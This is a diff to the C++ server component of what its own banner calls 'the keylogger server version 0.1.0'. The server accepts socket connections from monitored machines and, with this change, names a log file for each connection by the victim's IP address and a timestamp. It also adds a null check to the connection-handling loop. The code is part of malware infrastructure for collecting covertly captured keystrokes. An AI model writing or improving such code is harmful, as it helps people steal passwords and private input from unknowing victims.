@@ -3,7 +3,7 @@
 #include "ServerInterProcess.h"
 #include <stdio.h>
 #include <thread>
-#include<mutex>
+#include <mutex>
 #include <fcntl.h>
 #include <io.h>
 
@@ -17,6 +17,7 @@ void Listener()
     head= (SOCKETLIST*)malloc(sizeof(SOCKETLIST));
     (head->nextTarget)=0x00;
     (head->target)=0x00;
+    SYSTEMTIME timestamp;
 
     int cL;
     fprintf(stderr ,"Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
@@ -51,18 +52,22 @@ void Listener()
         SOCKET *acceptedTarget = new SOCKET;
         *acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
         SOCKETLIST *link = new SOCKETLIST;
-
+        GetSystemTime(&timestamp);
         if(*acceptedTarget==INVALID_SOCKET)
         {
             fprintf(stderr ,"\n\t\t[*] error connecting");
         }
         else
         {
+
             fprintf(stderr ," connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
             u_long mode =1;
             ioctlsocket(*acceptedTarget,FIONBIO,&mode);
 
             link->target = acceptedTarget;
+            link->name = (char*)malloc(0xf0);
+            sprintf(link->name,"%d_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
+            timestamp.wHour,timestamp.wMinute,timestamp.wSecond,timestamp.wMilliseconds);
 
             mu.lock();
             /*
@@ -96,7 +101,8 @@ void Handler()
         SOCKETLIST previousLink;
         while(1)
         {
-            while((head->target)== NULL )
+
+            while(head==nullptr ||(head->target)== NULL )
                 Sleep(1);
             link->nextTarget=head->nextTarget;
             link->target=head->target;
@@ -127,7 +133,7 @@ void Handler()
                     }
                     else
                     {
-                        mu.lock();
+                    mu.lock();
                       link->target = link->nextTarget->target;
                       link->nextTarget=link->nextTarget->nextTarget;
                       head = link;
